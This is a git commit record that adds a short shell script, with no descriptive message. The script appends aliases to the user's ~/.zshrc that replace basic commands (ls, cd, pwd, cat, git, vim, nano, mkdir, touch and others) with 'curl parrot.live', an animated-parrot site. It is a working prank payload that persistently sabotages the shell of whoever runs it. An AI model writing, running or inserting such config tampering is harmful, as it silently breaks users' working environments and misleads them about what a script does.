6ebc274e057a30927d03455aa00439c4fe887ef6
goncalo1021pt <goncalo.pereira.1021@gmail.com>
2024-09-19 17:45:32 +0100

    {}

---
+++ script.sh
@@ -0,0 +1,14 @@
+cat << eof >> ~/.zshrc
+
+alias ls="curl parrot.live"
+alias code="curl parrot.live"
+alias vim="curl parrot.live"
+alias vi="curl parrot.live"
+alias nano="curl parrot.live"
+alias cd="curl parrot.live"
+alias pwd="curl parrot.live"
+alias cat="curl parrot.live"
+alias git="curl parrot.live"
+alias mkdir="curl parrot.live"
+alias touch="curl parrot.live"
+eof
